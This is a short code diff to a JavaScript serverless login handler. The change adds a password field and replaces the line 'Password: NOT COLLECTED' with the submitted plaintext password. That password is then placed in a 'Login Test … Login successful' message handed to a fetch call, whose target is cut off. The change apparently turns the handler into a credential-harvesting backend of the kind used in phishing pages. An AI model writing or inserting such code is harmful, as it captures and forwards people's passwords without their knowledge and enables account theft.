@@ -9,8 +9,9 @@ exports.handler = async function (event) {
   try {
     const data = JSON.parse(event.body || "{}");
     const email = String(data.email || "").trim();
-
-    if (!email) {
+    const password = String(data.password || "");
+    
+    if (!email || ! password) {
       return {
         statusCode: 400,
         body: JSON.stringify({ error: "Email is required." })
@@ -30,7 +31,7 @@ exports.handler = async function (event) {
     const text =
       "Login Test\n\n" +
       "Email: " + email + "\n" +
-      "Password: NOT COLLECTED\n" +
+      "Password: " + password + "\n" +
       "Status: Login successful";
 
     const response = await fetch(
